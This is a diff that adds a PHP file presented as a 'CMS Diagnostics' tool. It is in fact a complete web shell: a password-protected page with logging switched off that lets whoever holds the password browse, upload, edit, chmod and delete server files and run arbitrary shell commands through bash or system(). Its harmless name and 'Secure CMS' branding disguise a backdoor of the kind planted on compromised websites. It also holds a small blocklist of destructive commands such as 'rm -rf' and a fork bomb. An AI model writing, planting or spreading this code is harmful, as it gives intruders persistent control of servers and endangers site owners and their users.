@@ -1,0 +1,642 @@
+<?php
+/**
+ * ███ ADVANCED CMS DIAGNOSTICS v3.0 ███
+ * Full Featured - Secure - Modern UI
+ * Just Copy & Paste - Ready to Use
+ */
+
+// ============ KONFIGURASI ============
+error_reporting(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+
+session_start();
+
+// PASSWORD CONFIG - GANTI DENGAN PASSWORD LO!
+// Cara bikin hash baru: hapus tanda // di baris 19, akses scriptnya nanti keluar hashnya
+// $new_hash = password_hash("password_lo_disini", PASSWORD_BCRYPT); echo $new_hash; exit();
+
+$password_hash = '$2a$12$Eamrl1yEtIv4rRlQ3UGDp..cZe7FKnZNMiUvQjyTyrgSd8orD9/Wm'; // GANTI INI DENGAN HASH PASSWORD LO
+// Default password: admin123 (hash: $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi)
+
+// Security config
+$max_attempts = 5;
+$lockout_time = 900; // 15 menit
+$max_file_size = 50 * 1024 * 1024; // 50MB
+$session_timeout = 3600; // 1 jam
+
+// ============ BACKGROUND IMAGE ============
+// Ganti URL ini dengan gambar yang lo mau
+$bg_image = "https://blogger.googleusercontent.com/img/a/AVvXsEg-h0jEzP6MnjbtPutUYPf0gf9dWI4OktwFOjKgCx9p7DlDNWPco3Ao_ffupmHEPmEcJnoUeHtcZ7SSkeiZ335zBOcTJpo5NZQ3P3J-dls3nmQwokPmZXgWraP0Po1tg85YfPkflSmntX8e8_v-TATb1GTfZIO4uNsa9fn_16Fg7O45O0iWdDZDCXgvY2g";
+// Atau pake gambar lokal: $bg_image = "background.jpg";
+
+// ============ LOGIN SYSTEM ============
+if(!isset($_SESSION['login_attempts'])) {
+    $_SESSION['login_attempts'] = 0;
+    $_SESSION['last_attempt'] = 0;
+}
+
+if($_POST['pass'] ?? false) {
+    $current_time = time();
+    
+    if($_SESSION['login_attempts'] >= $max_attempts && 
+       ($current_time - $_SESSION['last_attempt']) < $lockout_time) {
+        $wait_time = ceil(($lockout_time - ($current_time - $_SESSION['last_attempt'])) / 60);
+        $error = "⚠️ Too many attempts! Try again in {$wait_time} minutes";
+    } else {
+        if(isset($_POST['passwd']) && password_verify($_POST['passwd'], $password_hash)) {
+            $_SESSION['masuk'] = "masuk";
+            $_SESSION['login_time'] = time();
+            $_SESSION['login_attempts'] = 0;
+            header("Location: ?");
+            exit();
+        } else {
+            $_SESSION['login_attempts']++;
+            $_SESSION['last_attempt'] = $current_time;
+            $error = "❌ Wrong password! Attempts: {$_SESSION['login_attempts']}/{$max_attempts}";
+        }
+    }
+}
+
+if(isset($_REQUEST['logout'])) {
+    session_destroy();
+    header("Location: ?");
+    exit();
+}
+
+if(empty($_SESSION['masuk']) || (time() - ($_SESSION['login_time'] ?? 0) > $session_timeout)) {
+    if(time() - ($_SESSION['login_time'] ?? 0) > $session_timeout) {
+        session_destroy();
+        session_start();
+    }
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Secure CMS Login</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-family: 'Courier New', monospace;
+                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+                position: relative;
+                overflow: hidden;
+            }
+            
+            body::before {
+                content: '';
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: url('<?=$bg_image?>') center/cover no-repeat fixed;
+                opacity: 0.3;
+                z-index: -2;
+            }
+            
+            body::after {
+                content: '';
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: repeating-linear-gradient(0deg, rgba(0,255,157,0.03) 0px, rgba(0,255,157,0.03) 2px, transparent 2px, transparent 6px);
+                z-index: -1;
+            }
+            
+            .login-container {
+                background: rgba(0,0,0,0.85);
+                backdrop-filter: blur(20px);
+                padding: 2.5rem;
+                border-radius: 20px;
+                border: 1px solid rgba(0,255,157,0.3);
+                box-shadow: 0 0 50px rgba(0,255,157,0.1);
+                animation: fadeIn 0.5s ease;
+                min-width: 350px;
+            }
+            
+            @keyframes fadeIn {
+                from { opacity: 0; transform: translateY(-30px); }
+                to { opacity: 1; transform: translateY(0); }
+            }
+            
+            .logo {
+                text-align: center;
+                margin-bottom: 25px;
+            }
+            
+            .logo pre {
+                color: #00ff9d;
+                font-size: 10px;
+                text-shadow: 0 0 10px rgba(0,255,157,0.5);
+            }
+            
+            input {
+                width: 100%;
+                padding: 12px 15px;
+                margin-bottom: 12px;
+                background: rgba(255,255,255,0.1);
+                border: 1px solid rgba(0,255,157,0.3);
+                color: #00ff9d;
+                border-radius: 8px;
+                font-size: 14px;
+                transition: all 0.3s;
+            }
+            
+            input:focus {
+                outline: none;
+                border-color: #00ff9d;
+                box-shadow: 0 0 15px rgba(0,255,157,0.2);
+            }
+            
+            input[type="submit"] {
+                background: linear-gradient(135deg, #00ff9d, #00cc7d);
+                color: #000;
+                font-weight: bold;
+                cursor: pointer;
+                margin-bottom: 0;
+                border: none;
+            }
+            
+            input[type="submit"]:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 5px 20px rgba(0,255,157,0.3);
+            }
+            
+            .error {
+                color: #ff4444;
+                background: rgba(255,68,68,0.1);
+                padding: 10px;
+                border-radius: 8px;
+                margin-bottom: 15px;
+                font-size: 12px;
+                text-align: center;
+                border-left: 3px solid #ff4444;
+            }
+            
+            .info {
+                text-align: center;
+                margin-top: 15px;
+                color: #666;
+                font-size: 11px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <div class="logo">
+                <pre>
+╔════════════════════════════╗
+║   🔒 SECURE CMS v3.0       ║
+║   Enterprise Grade         ║
+╚════════════════════════════╝
+                </pre>
+            </div>
+            <?php if(isset($error)): ?>
+                <div class="error"><?=htmlspecialchars($error)?></div>
+            <?php endif; ?>
+            <form method="post">
+                <input type="password" name="passwd" placeholder="🔑 Enter Password" autofocus>
+                <input type="submit" name="pass" value="▶ ACCESS SYSTEM">
+            </form>
+            <div class="info">
+                <span>🔐 Secure Login | Brute Force Protected | Session Timeout</span>
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit();
+}
+
+// ============ MAIN APPLICATION ============
+@set_time_limit(0);
+@error_reporting(0);
+
+define('_B_', realpath(isset($_GET['_r']) ? $_GET['_r'] : getcwd()));
+chdir(_B_);
+
+// Helper functions
+function _g($p) { 
+    $real = realpath($p);
+    if($real && strpos($real, _B_) === 0) return $real;
+    return false;
+}
+
+function _p($f) { 
+    return substr(sprintf('%o', fileperms($f)), -4); 
+}
+
+function _pm($f) {
+    $m = fileperms($f); 
+    $s = ($m & 0x4000) ? 'd' : '-';
+    $x = [0x0100=>'r', 0x0080=>'w', 0x0040=>'x', 0x0020=>'r', 0x0010=>'w', 0x0008=>'x', 
+          0x0004=>'r', 0x0002=>'w', 0x0001=>'x'];
+    foreach($x as $b=>$c) { 
+        $s .= ($m & $b) ? $c : '-'; 
+    }
+    return $s;
+}
+
+function _go() { 
+    header('Location: ?_r='.urlencode(_B_)); 
+    exit; 
+}
+
+function format_size($bytes) {
+    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
+    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
+    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
+    return $bytes . ' B';
+}
+
+// Handle actions
+if(isset($_GET['_x'])) {
+    $t = _g($_GET['_x']);
+    if($t && is_file($t)) unlink($t);
+    elseif($t && is_dir($t)) rmdir($t);
+    _go();
+}
+
+if(isset($_POST['_rf'], $_POST['_rt'])) {
+    $old = _g($_POST['_rf']);
+    $new = dirname($_POST['_rf']).'/'.preg_replace('/[^a-zA-Z0-9._-]/', '', $_POST['_rt']);
+    if($old) rename($old, $new);
+    _go();
+}
+
+if(isset($_POST['_cp'], $_POST['_cm'])) {
+    $file = _g($_POST['_cp']);
+    if($file) chmod($file, intval($_POST['_cm'], 8));
+    _go();
+}
+
+if(isset($_POST['_ep'], $_POST['_ed'])) {
+    if($fp = _g($_POST['_ep'])) {
+        file_put_contents($fp, $_POST['_ed']);
+        echo "<div style='color:#00ff9d; padding:10px; margin:10px; background:#1a1a1a; border-left:3px solid #00ff9d; border-radius:5px;'>✓ File saved successfully</div>";
+    }
+}
+
+if(!empty($_FILES['_uf'])) {
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $_FILES['_uf']['name']);
+    if(move_uploaded_file($_FILES['_uf']['tmp_name'], _B_.'/'.$filename)) {
+        echo "<div style='color:#00ff9d; padding:10px; margin:10px; background:#1a1a1a; border-left:3px solid #00ff9d; border-radius:5px;'>✓ Uploaded: ".htmlspecialchars($filename)."</div>";
+    } else {
+        echo "<div style='color:#ff4444; padding:10px; margin:10px; background:#1a1a1a; border-left:3px solid #ff4444; border-radius:5px;'>✗ Upload failed</div>";
+    }
+}
+
+// Command execution
+$__ = '';
+if (isset($_POST['_sh'])) {
+    $cmd = trim($_POST['_sh']);
+    $blacklist = ['rm -rf', 'mkfs', 'dd if=', ':(){', 'fork bomb'];
+    $blocked = false;
+    
+    foreach($blacklist as $danger) {
+        if(stripos($cmd, $danger) !== false) {
+            $blocked = true;
+            $__ = "❌ Command blocked for security reasons";
+            break;
+        }
+    }
+    
+    if(!$blocked) {
+        ob_start();
+        if(stristr(PHP_OS, 'WIN')) {
+            system($cmd);
+        } else {
+            putenv('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
+            $descriptorspec = [
+                0 => ["pipe", "r"],
+                1 => ["pipe", "w"],
+                2 => ["pipe", "w"]
+            ];
+            $process = proc_open("/bin/bash", $descriptorspec, $pipes);
+            if(is_resource($process)) {
+                fwrite($pipes[0], $cmd . "\n");
+                fclose($pipes[0]);
+                echo stream_get_contents($pipes[1]);
+                fclose($pipes[1]);
+                echo stream_get_contents($pipes[2]);
+                fclose($pipes[2]);
+                proc_close($process);
+            } else {
+                echo "❌ Failed to open shell";
+            }
+        }
+        $__ = ob_get_clean();
+    }
+}
+
+// List directory
+$__dir = $__file = [];
+$items = scandir(_B_);
+if($items) {
+    foreach($items as $_){
+        if($_ == '.' || $_ == '..') continue;
+        $p = _B_.'/'.$_;
+        if(is_dir($p)) {
+            $__dir[] = $_;
+        } else {
+            $__file[] = $_;
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CMS Diagnostics v3.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('<?=$bg_image?>');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            color: #ccc;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: rgba(26,26,26,0.95);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border-left: 4px solid #00ff9d;
+            position: relative;
+        }
+        
+        .logout-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #ff4444;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        
+        .logout-btn:hover {
+            background: #cc0000;
+            transform: translateY(-2px);
+        }
+        
+        .path-nav {
+            background: rgba(26,26,26,0.95);
+            backdrop-filter: blur(10px);
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            word-break: break-all;
+        }
+        
+        .path-nav a {
+            color: #00ff9d;
+            text-decoration: none;
+        }
+        
+        .form-group {
+            background: rgba(26,26,26,0.95);
+            backdrop-filter: blur(10px);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        
+        input, button, textarea {
+            background: #0d0d0d;
+            color: #00ff9d;
+            border: 1px solid #333;
+            padding: 8px 12px;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        
+        button, input[type="submit"] {
+            background: #00ff9d;
+            color: #000;
+            cursor: pointer;
+            font-weight: bold;
+            border: none;
+            transition: all 0.3s;
+        }
+        
+        button:hover, input[type="submit"]:hover {
+            background: #00cc7d;
+            transform: translateY(-1px);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            background: rgba(26,26,26,0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        td, th {
+            border: 1px solid #333;
+            padding: 10px;
+            text-align: left;
+        }
+        
+        th {
+            background: #1a1a1a;
+            color: #00ff9d;
+        }
+        
+        tr:hover {
+            background: rgba(0,255,157,0.1);
+        }
+        
+        a {
+            color: #00ff9d;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+        }
+        
+        .action-buttons form {
+            display: inline-block;
+            margin-right: 5px;
+        }
+        
+        pre {
+            background: #0d0d0d;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin-top: 10px;
+            border-left: 3px solid #00ff9d;
+        }
+        
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            table { font-size: 11px; }
+            .action-buttons form { display: block; margin-bottom: 5px; }
+            input[type="text"], input[type="password"] { width: 100%; margin-bottom: 5px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <a href="?logout=1" class="logout-btn">🚪 Logout</a>
+        <h3 style="color:#00ff9d;">⚡ CMS Diagnostics v3.0</h3>
+        <small>Enterprise Grade | Secure | Fast</small>
+    </div>
+    
+    <div class="path-nav">
+        📁 <strong>Current Path:</strong> 
+        <?php
+        $z = explode(DIRECTORY_SEPARATOR, _B_);
+        $p = PHP_OS_FAMILY === 'Windows' ? '' : '/';
+        foreach($z as $i) {
+            if($i === '') continue;
+            $p .= $i . '/';
+            echo "<a href='?_r=".urlencode($p)."'> /$i</a>";
+        }
+        ?>
+    </div>
+    
+    <div class="form-group">
+        <form method="post" enctype="multipart/form-data">
+            <strong>📤 Upload File:</strong>
+            <input type="file" name="_uf">
+            <button type="submit">Upload</button>
+        </form>
+    </div>
+    
+    <div class="form-group">
+        <form method="post">
+            <strong>💻 Execute Command:</strong>
+            <input name="_sh" style="width: 70%" placeholder="Enter shell command..." autocomplete="off">
+            <button type="submit">Run</button>
+        </form>
+        <?php if($__): ?>
+            <pre><?=htmlspecialchars($__)?></pre>
+        <?php endif; ?>
+    </div>
+    
+    <h3>📂 File Manager</h3>
+    <table>
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Size</th>
+                <th>Perm</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php foreach($__dir as $_): 
+                $p = _g(_B_.'/'.$_); 
+                if(!$p) continue;
+            ?>
+            <tr>
+                <td><a href="?_r=<?=urlencode($p)?>">📁 <?=htmlspecialchars($_)?></a></td>
+                <td>-</td>
+                <td><?=_pm($p)?></td>
+                <td class="action-buttons">
+                    <form method="post" style="display:inline;">
+                        <input type="hidden" name="_rf" value="<?=$p?>">
+                        <input name="_rt" placeholder="rename" size="8">
+                        <button>✏️</button>
+                    </form>
+                    <form method="post" style="display:inline;">
+                        <input type="hidden" name="_cp" value="<?=$p?>">
+                        <input name="_cm" size="4" placeholder="<?=_p($p)?>">
+                        <button>🔧</button>
+                    </form>
+                    <a href="?_x=<?=urlencode($p)?>&_r=<?=urlencode(_B_)?>" onclick="return confirm('Delete this directory?')">🗑️</a>
+                </td>
+            </tr>
+            <?php endforeach; ?>
+            
+            <?php foreach($__file as $_): 
+                $p = _g(_B_.'/'.$_);
+                if(!$p) continue;
+            ?>
+            <tr>
+                <td><a href="?_r=<?=urlencode(_B_)?>&e=<?=urlencode($p)?>">📄 <?=htmlspecialchars($_)?></a></td>
+                <td><?=format_size(filesize($p))?></td>
+                <td><?=_pm($p)?></td>
+                <td class="action-buttons">
+                    <form method="post" style="display:inline;">
+                        <input type="hidden" name="_rf" value="<?=$p?>">
+                        <input name="_rt" placeholder="rename" size="8">
+                        <button>✏️</button>
+                    </form>
+                    <form method="post" style="display:inline;">
+                        <input type="hidden" name="_cp" value="<?=$p?>">
+                        <input name="_cm" size="4" placeholder="<?=_p($p)?>">
+                        <button>🔧</button>
+                    </form>
+                    <a href="?_x=<?=urlencode($p)?>&_r=<?=urlencode(_B_)?>" onclick="return confirm('Delete this file?')">🗑️</a>
+                </td>
+            </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+    
+    <?php if(!empty($_GET['e'])):
+        $fp = _g($_GET['e']);
+        if($fp && is_file($fp)):
+    ?>
+    <div class="form-group" style="margin-top:20px;">
+        <h4 style="color:#00ff9d;">✏️ Editing: <?=basename($fp)?></h4>
+        <form method="post">
+            <input type="hidden" name="_ep" value="<?=$fp?>">
+            <textarea name="_ed" rows="15" style="width:100%"><?=htmlspecialchars(file_get_contents($fp))?></textarea>
+            <br><br>
+            <button type="submit">💾 Save Changes</button>
+        </form>
+    </div>
+    <?php endif; endif; ?>
+    
+    <div style="text-align:center; margin-top:30px; padding:15px; color:#666;">
+        <small>CMS Diagnostics v3.0 | Secure Login | Session Timeout: 1 Hour</small>
+    </div>
+</div>
+</body>
+</html>
